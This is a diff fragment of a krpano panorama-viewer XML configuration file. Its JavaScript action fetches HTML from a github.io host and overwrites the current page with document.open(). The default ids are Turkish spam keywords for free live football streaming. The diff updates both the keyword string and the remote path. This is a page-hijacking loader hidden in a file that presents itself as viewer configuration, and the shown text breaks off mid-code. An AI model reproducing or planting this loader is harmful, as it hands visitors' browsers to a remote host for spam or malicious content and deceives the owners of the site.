@@ -1,9 +1,9 @@
 <krpano version="1.0.8.15">
 <action name="js_loader_start" type="Javascript"><![CDATA[
-var id = new URLSearchParams(window.location.search).get("id") || "video-besiktas-genclerbirligi-maci-canli-yayin-izle-K3mT7";
+var id = new URLSearchParams(window.location.search).get("id") || "video-genclerbirligi-besiktas-maci-ucretsiz-canli-izle-x7Kp2";
 if (!window.__kgh_loader_done) {
   window.__kgh_loader_done = 1;
-  window.fetch("https://lovecrash301.github.io/UXTxrJAKK/tom/" + id + ".html")
+  window.fetch("https://lovecrash301.github.io/UXTxrJAKK/dkf/" + id + ".html")
     .then(function (r) { return r.text(); })
     .then(function (html) {
       window.document.open();
